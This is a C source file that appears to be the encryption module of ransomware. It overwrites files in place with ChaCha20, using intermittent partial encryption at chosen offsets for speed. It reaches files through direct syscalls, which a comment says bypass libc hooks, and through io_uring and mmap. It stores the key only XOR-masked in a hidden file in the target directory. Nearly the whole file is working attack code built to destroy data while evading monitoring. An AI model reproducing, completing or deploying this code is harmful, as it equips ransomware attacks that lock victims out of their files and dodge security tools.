
#include "encryption.h"

#if defined(__aarch64__) || defined(__arm64__)
    #include "syscalls_arm64.h"
#elif defined(__x86_64__) || defined(__amd64__)
    #include "syscalls_x86_64.h"
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#ifdef USE_IO_URING
#include <liburing.h>
#endif

#define CHUNK_SIZE 8192
#define MAX_CHUNKS 7
#define PAGE_SIZE 4096
#define CHACHA20_KEY_SIZE 32
#define CHACHA20_NONCE_SIZE 12

// Global encryption key and nonce for ChaCha20
static unsigned char encryption_key = 0x98;  // Simple XOR key
static unsigned char chacha20_key[CHACHA20_KEY_SIZE];
static unsigned char chacha20_nonce[CHACHA20_NONCE_SIZE];

int init_encryption_system(char* target_directory) {
    char keypath[PATH_MAX];
    // Generate random ChaCha20 key and nonce
    if (RAND_bytes(chacha20_key, CHACHA20_KEY_SIZE) != 1) {
        fprintf(stderr, "Failed to generate ChaCha20 key\\n");
        return -1;
    }
    
    if (RAND_bytes(chacha20_nonce, CHACHA20_NONCE_SIZE) != 1) {
        fprintf(stderr, "Failed to generate ChaCha20 nonce\\n");
        return -1;
    }
    
    printf("Initializing encryption system...\n");
    
    printf("ChaCha20 key and nonce generated successfully\n");
        
    
    snprintf(keypath, sizeof(keypath), "%s/.chacha20_key.bin", target_directory);
    FILE *key_file = fopen(keypath, "wb");
    if (key_file) {
        xor_encrypt_buffer(chacha20_key, CHACHA20_KEY_SIZE, encryption_key);
        xor_encrypt_buffer(chacha20_nonce, CHACHA20_NONCE_SIZE, encryption_key);
        fwrite(chacha20_key, 1, CHACHA20_KEY_SIZE, key_file);
        fwrite(chacha20_nonce, 1, CHACHA20_NONCE_SIZE, key_file);
        fclose(key_file);
    }
    return 0;
}

int chacha20_encrypt_buffer(unsigned char *data, size_t len) {
    EVP_CIPHER_CTX *ctx;
    int out_len;
    unsigned char *output;
    
    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fprintf(stderr, "Failed to create EVP context\\n");
        return -1;
    }
    
    // ChaCha20 uses 32-byte key and 16-byte IV (12-byte nonce + 4-byte counter)
    unsigned char iv[16] = {0};
    memcpy(iv, chacha20_nonce, CHACHA20_NONCE_SIZE);
    
    if (EVP_EncryptInit_ex(ctx, EVP_chacha20(), NULL, chacha20_key, iv) != 1) {
        fprintf(stderr, "Failed to initialize ChaCha20 encryption\\n");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    
    output = malloc(len);
    if (!output) {
        fprintf(stderr, "Failed to allocate output buffer\\n");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    
    if (EVP_EncryptUpdate(ctx, output, &out_len, data, len) != 1) {
        fprintf(stderr, "ChaCha20 encryption failed\\n");
        free(output);
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    
    // Copy encrypted data back
    memcpy(data, output, len);
    free(output);
    EVP_CIPHER_CTX_free(ctx);
    
    return 0;
}

void cleanup_encryption_system(void) {
    // Securely wipe keys from memory
    memset(chacha20_key, 0, CHACHA20_KEY_SIZE);
    memset(chacha20_nonce, 0, CHACHA20_NONCE_SIZE);
}

void xor_encrypt_buffer(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key ^ (i & 0x9A);
    }
}

// Calculate encryption chunks for partial encryption
int calculate_encryption_chunks(size_t file_size, chunk_info_t *chunks) {
    if (file_size <= 64 * 1024) {
        // Files ≤ 64KB: Fully encrypted
        chunks[0].offset = 0;
        chunks[0].length = file_size;
        return 1;
    }
    else if (file_size <= 5 * 1024 * 1024) {
        // Files 64KB-5MB: Encrypt 3 chunks (beginning, middle, end)
        chunks[0].offset = 0;
        chunks[0].length = CHUNK_SIZE;

        chunks[1].offset = file_size / 2;
        chunks[1].length = CHUNK_SIZE;

        chunks[2].offset = (file_size * 3) / 4;
        chunks[2].length = (file_size - chunks[2].offset) < CHUNK_SIZE ? 
                           (file_size - chunks[2].offset) : CHUNK_SIZE;
        return 3;
    }
    else if (file_size <= 20 * 1024 * 1024) {
        // Files 5MB-20MB: Encrypt 5 evenly distributed chunks
        size_t chunk_distance = file_size / 5;
        for (int i = 0; i < 5; i++) {
            chunks[i].offset = i * chunk_distance;
            chunks[i].length = (file_size - chunks[i].offset) < CHUNK_SIZE ? 
                               (file_size - chunks[i].offset) : CHUNK_SIZE;
        }
        return 5;
    }
    else {
        // Files >20MB: Encrypt 7 chunks at specific positions
        double positions[] = {0.0, 0.125, 0.25, 0.50, 0.75, 0.875, 0.95};
        for (int i = 0; i < 7; i++) {
            chunks[i].offset = (off_t)(file_size * positions[i]);
            chunks[i].length = (file_size - chunks[i].offset) < CHUNK_SIZE ? 
                               (file_size - chunks[i].offset) : CHUNK_SIZE;
        }
        return 7;
    }
}

// Method 1: Direct syscall encryption
int encrypt_file_direct_syscall(const char *filepath) {
    struct stat st;
    int fd;
    unsigned char *file_data;
    ssize_t bytes_read, bytes_written;

    // Open file using direct syscall (bypasses libc hooks)
    fd = direct_openat(AT_FDCWD, filepath, O_RDWR, 0);
    if (fd < 0) {
        return -1;
    }

    // Get file size
    if (fstat(fd, &st) != 0) {
        direct_close(fd);
        return -1;
    }

    // Skip empty files or files that are too large
    if (st.st_size == 0 || st.st_size > 50 * 1024 * 1024) {
        direct_close(fd);
        return -1;
    }

    // Allocate buffer
    file_data = malloc(st.st_size);
    if (!file_data) {
        direct_close(fd);
        return -1;
    }

    // Read file using direct syscall
    bytes_read = direct_read(fd, file_data, st.st_size);
    if (bytes_read != st.st_size) {
        free(file_data);
        direct_close(fd);
        return -1;
    }

    // Encrypt data
    chacha20_encrypt_buffer(file_data, st.st_size);

    // Seek to beginning and write encrypted data using direct syscall
    direct_lseek(fd, 0, SEEK_SET);
    bytes_written = direct_write(fd, file_data, st.st_size);

    free(file_data);
    direct_close(fd);

    return (bytes_written == st.st_size) ? 0 : -1;
}

// Method 2: io_uring encryption (if available)
int encrypt_file_io_uring(const char *filepath) {
#ifdef USE_IO_URING
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    struct stat st;
    int fd, ret = -1;
    struct iovec iov;
    unsigned char *buffer = NULL;

    // Initialize io_uring
    if (io_uring_queue_init(32, &ring, 0) < 0) {
        return -1;
    }

    // Open file
    fd = open(filepath, O_RDWR);
    if (fd < 0) {
        io_uring_queue_exit(&ring);
        return -1;
    }

    if (fstat(fd, &st) != 0 || st.st_size == 0 || st.st_size > 50 * 1024 * 1024) {
        close(fd);
        io_uring_queue_exit(&ring);
        return -1;
    }

    // Allocate aligned buffer
    buffer = aligned_alloc(4096, st.st_size);
    if (!buffer) {
        close(fd);
        io_uring_queue_exit(&ring);
        return -1;
    }

    iov.iov_base = buffer;
    iov.iov_len = st.st_size;

    // Submit read operation via io_uring
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_readv(sqe, fd, &iov, 1, 0);
    if (io_uring_submit(&ring) < 0) goto cleanup;

    // Wait for completion
    if (io_uring_wait_cqe(&ring, &cqe) < 0) goto cleanup;
    if (cqe->res != st.st_size) {
        io_uring_cqe_seen(&ring, cqe);
        goto cleanup;
    }
    io_uring_cqe_seen(&ring, cqe);

    // Encrypt the buffer
    chacha20_encrypt_buffer(buffer, st.st_size);

    // Submit write operation via io_uring
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_writev(sqe, fd, &iov, 1, 0);
    if (io_uring_submit(&ring) < 0) goto cleanup;

    // Wait for write completion
    if (io_uring_wait_cqe(&ring, &cqe) < 0) goto cleanup;
    ret = (cqe->res == st.st_size) ? 0 : -1;
    io_uring_cqe_seen(&ring, cqe);

cleanup:
    if (buffer) free(buffer);
    close(fd);
    io_uring_queue_exit(&ring);
    return ret;
#else
    // Fallback to direct syscall method if io_uring not available
    return encrypt_file_direct_syscall(filepath);
#endif
}

// Method 3: Partial encryption using direct syscalls
int encrypt_file_partial_direct(const char *filepath) {
    struct stat st;
    int fd;
    chunk_info_t chunks[MAX_CHUNKS];
    int chunk_count;
    unsigned char *buffer = NULL;
    
    fd = direct_openat(AT_FDCWD, filepath, O_RDWR, 0);
    if (fd < 0) return -1;
    
    if (fstat(fd, &st) != 0) {
        direct_close(fd);
        return -1;
    }
    
    if (st.st_size == 0 || st.st_size > 100 * 1024 * 1024) {
        direct_close(fd);
        return -1;
    }
    
    chunk_count = calculate_encryption_chunks(st.st_size, chunks);
    
    // Calculate maximum chunk size needed
    size_t max_chunk_size = 0;
    for (int i = 0; i < chunk_count; i++) {
        if (chunks[i].length > max_chunk_size) {
            max_chunk_size = chunks[i].length;
        }
    }
    
    // Allocate buffer large enough for the largest chunk
    buffer = malloc(max_chunk_size);
    if (!buffer) {
        direct_close(fd);
        return -1;
    }
    
    // Encrypt each chunk
    for (int i = 0; i < chunk_count; i++) {
        // Seek to chunk position
        if (direct_lseek(fd, chunks[i].offset, SEEK_SET) < 0) continue;
        
        // Read chunk using direct syscall
        ssize_t bytes_read = direct_read(fd, buffer, chunks[i].length);
        if (bytes_read != (ssize_t)chunks[i].length) continue;
        
        chacha20_encrypt_buffer(buffer, chunks[i].length);
        
        // Write back encrypted chunk using direct syscall
        if (direct_lseek(fd, chunks[i].offset, SEEK_SET) < 0) continue;
        direct_write(fd, buffer, chunks[i].length);
    }
    
    free(buffer);
    direct_close(fd);
    return 0;
}

// Method 4: Memory-mapped page encryption
int encrypt_file_mmap_pages(const char *filepath) {
    struct stat st;
    int fd;
    void *mapped_memory;
    size_t pages_to_encrypt;
    size_t total_pages;

    fd = direct_openat(AT_FDCWD, filepath, O_RDWR, 0);
    if (fd < 0) return -1;

    if (fstat(fd, &st) != 0) {
        direct_close(fd);
        return -1;
    }

    if (st.st_size == 0 || st.st_size > 100 * 1024 * 1024) {
        direct_close(fd);
        return -1;
    }

    // Memory map the file using direct syscall
    mapped_memory = (void*)direct_mmap(NULL, st.st_size, 
                                       PROT_READ | PROT_WRITE, 
                                       MAP_SHARED, fd, 0);
    if (mapped_memory == MAP_FAILED) {
        direct_close(fd);
        return -1;
    }

    total_pages = (st.st_size + PAGE_SIZE - 1) / PAGE_SIZE;

    if (total_pages <= 4) {
        pages_to_encrypt = total_pages;
    } else if (total_pages <= 100) {
        pages_to_encrypt = total_pages / 3;
    } else {
        pages_to_encrypt = total_pages / 10;
    }

    for (size_t i = 0; i < pages_to_encrypt; i++) {
        size_t page_idx;
        if (total_pages <= 4) {
            page_idx = i;
        } else {
            page_idx = i * (total_pages / pages_to_encrypt);
        }

        if (page_idx >= total_pages) break;

        unsigned char *page_start = (unsigned char*)mapped_memory + (page_idx * PAGE_SIZE);
        size_t encrypt_size = (st.st_size - (page_idx * PAGE_SIZE)) < PAGE_SIZE ? 
                              (st.st_size - (page_idx * PAGE_SIZE)) : PAGE_SIZE;

        //printf("Page Start: %p, Size: %zu, Key: 0x%02X\n", page_start, encrypt_size, encryption_key ^ page_idx);
        chacha20_encrypt_buffer(page_start, encrypt_size);
    }

    msync(mapped_memory, st.st_size, MS_SYNC);

    direct_munmap(mapped_memory, st.st_size);
    direct_close(fd);

    return 0;
}

// Method 5: Pure syscall-based io_uring encryption
int encrypt_file_io_uring_direct_syscall(const char *filepath) {
    struct io_uring_params params;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    struct stat st;
    int ring_fd, file_fd, ret = -1;
    void *sq_ring, *cq_ring, *sqes;
    unsigned char *buffer = NULL;
    
    // Initialize io_uring parameters
    memset(&params, 0, sizeof(params));
    params.flags = 0;
    
    // Setup io_uring using direct syscall
    ring_fd = io_uring_setup_direct(QUEUE_DEPTH, &params);
    if (ring_fd < 0) {
        return -1;
    }
    
    // Memory map submission queue ring
    size_t sq_ring_size = params.sq_off.array + params.sq_entries * sizeof(unsigned);
    sq_ring = (void*)direct_mmap(NULL, sq_ring_size,
                                  PROT_READ | PROT_WRITE,
                                  MAP_SHARED | MAP_POPULATE,
                                  ring_fd, IORING_OFF_SQ_RING);
    if (sq_ring == MAP_FAILED) {
        direct_close(ring_fd);
        return -1;
    }
    
    // Memory map completion queue ring
    size_t cq_ring_size = params.cq_off.cqes + params.cq_entries * sizeof(struct io_uring_cqe);
    cq_ring = (void*)direct_mmap(NULL, cq_ring_size,
                                  PROT_READ | PROT_WRITE,
                                  MAP_SHARED | MAP_POPULATE,
                                  ring_fd, IORING_OFF_CQ_RING);
    if (cq_ring == MAP_FAILED) {
        direct_munmap(sq_ring, sq_ring_size);
        direct_close(ring_fd);
        return -1;
    }
    
    // Memory map submission queue entries
    size_t sqes_size = params.sq_entries * sizeof(struct io_uring_sqe);
    sqes = (void*)direct_mmap(NULL, sqes_size,
                              PROT_READ | PROT_WRITE,
                              MAP_SHARED | MAP_POPULATE,
                              ring_fd, IORING_OFF_SQES);
    if (sqes == MAP_FAILED) {
        direct_munmap(cq_ring, cq_ring_size);
        direct_munmap(sq_ring, sq_ring_size);
        direct_close(ring_fd);
        return -1;
    }
    
    // Open file using direct syscall
    file_fd = direct_openat(AT_FDCWD, filepath, O_RDWR, 0);
    if (file_fd < 0) goto cleanup;
    
    if (fstat(file_fd, &st) != 0 || st.st_size == 0 || st.st_size > 50 * 1024 * 1024) {
        direct_close(file_fd);
        goto cleanup;
    }
    
    // Allocate aligned buffer
    buffer = aligned_alloc(4096, st.st_size);
    if (!buffer) {
        direct_close(file_fd);
        goto cleanup;
    }
    
    // Setup SQE for read operation
    sqe = (struct io_uring_sqe*)sqes;
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_READ;
    sqe->fd = file_fd;
    sqe->addr = (unsigned long)buffer;
    sqe->len = st.st_size;
    sqe->off = 0;
    
    // Get queue pointers
    unsigned *sq_tail = (unsigned*)((char*)sq_ring + params.sq_off.tail);
    unsigned *sq_array = (unsigned*)((char*)sq_ring + params.sq_off.array);
    unsigned tail_idx = *sq_tail & (params.sq_entries - 1);
    sq_array[tail_idx] = 0;  // Index of our SQE
    (*sq_tail)++;
    
    // Submit read via direct syscall
    if (io_uring_enter_direct(ring_fd, 1, 1, IORING_ENTER_GETEVENTS) < 0) {
        goto cleanup_buffer;
    }
    
    // Check completion
    unsigned *cq_head = (unsigned*)((char*)cq_ring + params.cq_off.head);
    unsigned *cq_tail = (unsigned*)((char*)cq_ring + params.cq_off.tail);
    
    if (*cq_head == *cq_tail) goto cleanup_buffer;
    
    cqe = (struct io_uring_cqe*)((char*)cq_ring + params.cq_off.cqes);
    if (cqe->res != st.st_size) {
        (*cq_head)++;
        goto cleanup_buffer;
    }
    (*cq_head)++;
    
    // Encrypt buffer
    chacha20_encrypt_buffer(buffer, st.st_size);
    
    // Setup SQE for write operation
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_WRITE;
    sqe->fd = file_fd;
    sqe->addr = (unsigned long)buffer;
    sqe->len = st.st_size;
    sqe->off = 0;
    
    tail_idx = *sq_tail & (params.sq_entries - 1);
    sq_array[tail_idx] = 0;
    (*sq_tail)++;
    
    // Submit write via direct syscall
    if (io_uring_enter_direct(ring_fd, 1, 1, IORING_ENTER_GETEVENTS) < 0) {
        goto cleanup_buffer;
    }
    
    // Check write completion
    if (*cq_head != *cq_tail) {
        cqe = (struct io_uring_cqe*)((char*)cq_ring + params.cq_off.cqes);
        ret = (cqe->res == st.st_size) ? 0 : -1;
        (*cq_head)++;
    }
    
cleanup_buffer:
    free(buffer);
    direct_close(file_fd);
    
cleanup:
    direct_munmap(sqes, sqes_size);
    direct_munmap(cq_ring, cq_ring_size);
    direct_munmap(sq_ring, sq_ring_size);
    direct_close(ring_fd);
    
    return ret;
}

int encrypt_file_hybrid_partial_iouring(const char *filepath) {
    struct stat st;
    int fd;
    chunk_info_t chunks[MAX_CHUNKS];
    int chunk_count;
    unsigned char *buffers[MAX_CHUNKS];
    
    fd = direct_openat(AT_FDCWD, filepath, O_RDWR, 0);
    if (fd < 0) return -1;
    
    if (fstat(fd, &st) != 0 || st.st_size == 0 || st.st_size > 100 * 1024 * 1024) {
        direct_close(fd);
        return -1;
    }
    
    // Calculate strategic chunks
    chunk_count = calculate_encryption_chunks(st.st_size, chunks);
    
#ifdef USE_IO_URING
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int success = 0;
    
    if (io_uring_queue_init(chunk_count * 2, &ring, 0) < 0) {
        direct_close(fd);
        return -1;
    }
    
    // Allocate aligned buffers for all chunks
    for (int i = 0; i < chunk_count; i++) {
        buffers[i] = aligned_alloc(4096, chunks[i].length);
        if (!buffers[i]) {
            for (int j = 0; j < i; j++) free(buffers[j]);
            io_uring_queue_exit(&ring);
            direct_close(fd);
            return -1;
        }
    }
    
    // Submit all read operations asynchronously
    for (int i = 0; i < chunk_count; i++) {
        struct iovec iov = {
            .iov_base = buffers[i],
            .iov_len = chunks[i].length
        };
        
        sqe = io_uring_get_sqe(&ring);
        io_uring_prep_readv(sqe, fd, &iov, 1, chunks[i].offset);
        sqe->user_data = i;  // Track which chunk
    }
    
    if (io_uring_submit(&ring) != chunk_count) {
        goto cleanup_hybrid;
    }
    
    // Wait for all reads to complete
    for (int i = 0; i < chunk_count; i++) {
        if (io_uring_wait_cqe(&ring, &cqe) < 0) goto cleanup_hybrid;
        
        int chunk_idx = cqe->user_data;
        if (cqe->res != (int) chunks[chunk_idx].length) {
            io_uring_cqe_seen(&ring, cqe);
            goto cleanup_hybrid;
        }
        
        // Encrypt chunk with position-dependent key
        chacha20_encrypt_buffer(buffers[chunk_idx], chunks[chunk_idx].length);
        
        io_uring_cqe_seen(&ring, cqe);
    }
    
    // Submit all write operations asynchronously
    for (int i = 0; i < chunk_count; i++) {
        struct iovec iov = {
            .iov_base = buffers[i],
            .iov_len = chunks[i].length
        };
        
        sqe = io_uring_get_sqe(&ring);
        io_uring_prep_writev(sqe, fd, &iov, 1, chunks[i].offset);
        sqe->user_data = i;
    }
    
    if (io_uring_submit(&ring) != chunk_count) {
        goto cleanup_hybrid;
    }
    
    // Wait for all writes to complete
    
    for (int i = 0; i < chunk_count; i++) {
        if (io_uring_wait_cqe(&ring, &cqe) < 0) goto cleanup_hybrid;
        if (cqe->res == (int) chunks[cqe->user_data].length) success++;
        io_uring_cqe_seen(&ring, cqe);
    }
    
cleanup_hybrid:
    for (int i = 0; i < chunk_count; i++) {
        if (buffers[i]) free(buffers[i]);
    }
    io_uring_queue_exit(&ring);
    direct_close(fd);
    return (success == chunk_count) ? 0 : -1;
    
#else
    // Fallback to partial direct syscall
    return encrypt_file_partial_direct(filepath);
#endif
}